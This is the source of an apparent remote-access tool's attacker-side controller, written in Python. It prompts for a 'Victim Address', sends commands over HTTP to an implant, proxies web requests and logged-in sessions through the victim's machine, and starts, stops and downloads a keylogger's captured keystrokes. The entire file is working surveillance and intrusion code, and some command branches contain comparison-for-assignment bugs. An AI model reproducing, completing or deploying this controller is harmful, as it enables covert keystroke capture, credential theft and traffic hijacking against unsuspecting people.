#!/usr/bin/python3

import requests;
import json;
import os;
import threading;
from sys import argv;
import time;

''' GLOBAL VARS '''
VICTIM = ["127.0.0.1",1337]; # (<ip_address>, <port_no.>)

''' FUNCTIONS '''
def menu():
	choices = ["tunnel", "keylogger", "quit"];
	print(" :: MENU ::");
	print(" - tunnel");
	print(" - keylogger");
	print(" - quit");
	while True:
		inp = input("-> ").lstrip(" ").rstrip(" ");
		if inp in choices:
			return(inp);
		
		
'''
payload format:

'''	
def send(action,**params): # send(action [, sub_action=<>, extras=<>])
	params["action"]=action;
	payload = json.dumps(params);
	vic_url = "http://"+VICTIM[0]+":"+str(VICTIM[1])+"";
	resp = requests.get(vic_url,data=payload);
	return(resp.content);

def tunnel():
	print(":: Tunnel ::");
	print("1 - get");
	print("2 - post");
	print("3 - session");
	print("4 - login session");
	sub_action = int(input("-> "));
	
	param_dict = dict();
	if sub_action == 4:
		param_string = input("Parameters as comma-separated <name_of_field>:<value> -> ");
		param_list = param_string.split(",");
		for p in param_list:
			key,val = p.split(":");
			param_dict[key]=val;
		sub_action="login session";
	elif sub_action == 1:
		sub_action="get";
	elif sub_action == 2:
		sub_action == "post";
	elif sub_action == 3:
		sub_action == "session";
	
	url = input("[address] -> ");
	print("Fetching....");
	start_time = time.time();
	bin_resp=None;
	if sub_action != "login session":
		bin_resp = send("tunnel",value=url,sub_action=sub_action);
	else:
		bin_resp = send("tunnel",value=url,sub_action=sub_action,extras=param_dict);
	fetch_time = time.time() - start_time;
	print("Got response [in "+str(fetch_time)+" seconds]! Saving to op.html");
	op_file = open("op.html","wb");
	op_file.write(bin_resp);
	op_file.close();
	choice = input("Open Site? [y/n] : ");
	if choice == "y" or choice == "Y":
		threading.Thread(target=os.system("xdg-open op.html 1> /dev/null"));
	return;

def keylogger(): 
	print(":: Keylogger ::");
	print("1 - Start keylogger");
	print("2 - Stop Keylogger (do this first if you want to fetch the log file)");
	print("3 - Get log file");
	sub_action = int(input("-> "));
	
	if sub_action == 1:
		sub_action = "start";
	elif sub_action == 2:
		sub_action = "stop";
	elif sub_action == 3:
		sub_action = "get";
		
	resp = send("keylogger",sub_action=sub_action);
	if sub_action == "get":
		print("Fetched log file, saving to log.txt");
		f = open("log.txt","wb");
		f.write(resp);
		f.close();
	
	return;

def get_target():
	while True:
		ip = input("Victim Address -> ");
		if len(ip.split(".")) == 4:
			return(ip);

''' MAIN '''
if __name__ == "__main__":
	print("Starting attacker-side program....");
	run_flag = True;
	
	if len(argv) >= 2:
		VICTIM[0]=argv[1];
	else:
		VICTIM[0] = get_target();
		
	while run_flag == True:
		choice = menu();
		if choice == "tunnel":
			tunnel();
		if choice == "keylogger":
			keylogger();
		elif choice == "quit":
			run_flag = False;
		print("\n\n");
